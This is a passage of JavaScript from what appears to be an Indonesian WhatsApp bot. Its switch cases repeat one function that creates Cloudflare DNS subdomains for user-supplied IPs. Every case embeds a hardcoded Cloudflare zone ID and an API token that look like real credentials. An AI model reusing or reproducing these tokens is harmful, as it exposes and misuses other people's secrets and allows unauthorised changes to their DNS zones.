                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = MIKKU - HOST 🛍\n┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
 break
   case 'd85': {
        if (!isOwner && !isGroup) return tamzz.sendMessage(from, {audio: fs.readFileSync('./tamzz/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:kalgans})
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "93d9016d9747d75300815943d14b6268";
               let apitoken = "9be2dab811cd3cc6a6e7a7467166155e";
               let tld = "nerokpanel.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = MIKKU - HOST 🛍\n┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
 break
 case 'd6': {
        if (!isOwner && !isGroup) return tamzz.sendMessage(from, {audio: fs.readFileSync('./tamzz/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:kalgans})
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "c2c8ddf4f1bfd0d0c11eb0ed83a634f9";
               let apitoken = "RHmElwWM5pEb3HsWi82uramdhi9wzDsaU8F9JV6F";
               let tld = "r0ulxye4.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = MIKKU - HOST 🛍\n┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
 break                                                                               
 
 case 'd7': {
        if (!isOwner && !isGroup) return tamzz.sendMessage(from, {audio: fs.readFileSync('./tamzz/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:kalgans})
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "7432f024eeeaa0367fd985a18b2729cc";
               let apitoken = "RsbJAI6X7s7bPEj23R7sf28cqHibApP1EBSoF4FZ";
               let tld = "lanzpanel.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = MIKKU - HOST 🛍\n┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
  break  
case 'd8': {
        if (!isOwner && !isGroup) return tamzz.sendMessage(from, {audio: fs.readFileSync('./tamzz/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:kalgans})
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "891a2e5d4ac5b3db4fbcef8d9088ad38";
               let apitoken = "V2BCJ-jhHXQlkN5-_Jv-CuXEtJbLT9fo7NWAlMK2";
               let tld = "cpanel-vip.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = MIKKU - HOST 🛍\n┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
 break
           
                                               case 'd9': {
        if (!isOwner && !isGroup) return tamzz.sendMessage(from, {audio: fs.readFileSync('./tamzz/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:kalgans})
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "a0cef62d7194b16e1706f5d48c41129a";
               let apitoken = "_xnkxZ50i8J5p0Y148oSlomu0NoIt2mTGWxu0CsR"
               let tld = "kukurahost.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = MIKKU - HOST 🛍\n┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
 break 
  
           
 case 'd10': {
        if (!isOwner && !isGroup) return tamzz.sendMessage(from, {audio: fs.readFileSync('./tamzz/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:kalgans})
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "d41a17e101c0f89f0aec609c31137f91";
               let apitoken = "miC4wpso1vMcRFR62ZvOFfFd9xTlawvHcXPYZgwi"
               let tld = "panellstore.net";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = MIKKU - HOST 🛍\n┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
 break                                                                                
 
 case 'd11': {
        if (!isOwner && !isGroup) return tamzz.sendMessage(from, {audio: fs.readFileSync('./tamzz/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:kalgans})
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "03f3569e809aa63eb40d842af3ddb523";
               let apitoken = "kLS7qdEt9zuC9UJr2u5ok5LsPaKKk0p0vuuTgmEo"
               let tld = "panelprivv.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = MIKKU - HOST 🛍\n┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
 break 
 
  case 'd63': {
        if (!isOwner && !isGroup) return tamzz.sendMessage(from, {audio: fs.readFileSync('./tamzz/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:kalgans})
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "a476ffcf9243c44a02220f184da527e8";
               let apitoken = "RsbJAI6X7s7bPEj23R7sf28cqHibApP1EBSoF4FZ"
               let tld = "mypanell.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = MIKKU - HOST 🛍\n┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
 break 
                                                                                         case 'd12': {
        if (!isOwner && !isGroup) return tamzz.sendMessage(from, {audio: fs.readFileSync('./tamzz/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:kalgans})
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "5f4a582dd80c518fb2c7a425256fb491";
               let apitoken = "iQbJQgfe6kTyEfdOy_EV8UAHKj80VgQg4t6rTjby"
               let tld = "tokopanellku.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = MIKKU - HOST 🛍\n┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break


case 'd13': {
        if (!isOwner && !isGroup) return tamzz.sendMessage(from, {audio: fs.readFileSync('./tamzz/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:kalgans})
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "15b97d8a42af1c00a70070e577ce7301";
               let apitoken = "RsbJAI6X7s7bPEj23R7sf28cqHibApP1EBSoF4FZ"
               let tld = "kiospanell.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = MIKKU - HOST 🛍\n┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break
case 'd14': {
        if (!isOwner && !isGroup) return tamzz.sendMessage(from, {audio: fs.readFileSync('./tamzz/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:kalgans})
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "e60307683c18389584e9ae2f9fa707b2";
               let apitoken = "9hc8x5B4TewRTpXxETV_laVGksk3MyCfBXOgHgmg"
               let tld = "moon-offc.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = MIKKU - HOST 🛍\n┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break
case 'd15': {
        if (!isOwner && !isGroup) return tamzz.sendMessage(from, {audio: fs.readFileSync('./tamzz/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:kalgans})
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "ba364ec1df6998c10487aee2a61b7f0d";
               let apitoken = "hnM3i7bBHzcIRXqveYKR3KTnsfrkigkhar2vEUcP"
               let tld = "moon-offc.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = MIKKU - HOST 🛍\n┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break


case 'd16': {
        if (!isOwner && !isGroup) return tamzz.sendMessage(from, {audio: fs.readFileSync('./tamzz/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:kalgans})
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "b13ecb3a576f3c43f59de68b579c5e2f";
               let apitoken = "z2QcCcun1gEWOXtxkX4JtyKoRfJlhCS1myDPx2ME"
               let tld = "dvdz-xdz.me";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya Onii Chan?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid Onii Chan" : "mana ip nya Onii Chan");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = MIKKU - HOST 🛍\n┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
break


case 'd17': {
        if (!isOwner && !isGroup) return tamzz.sendMessage(from, {audio: fs.readFileSync('./tamzz/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:kalgans})
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "2feafa10ec4054af7cb04b18515013e5";
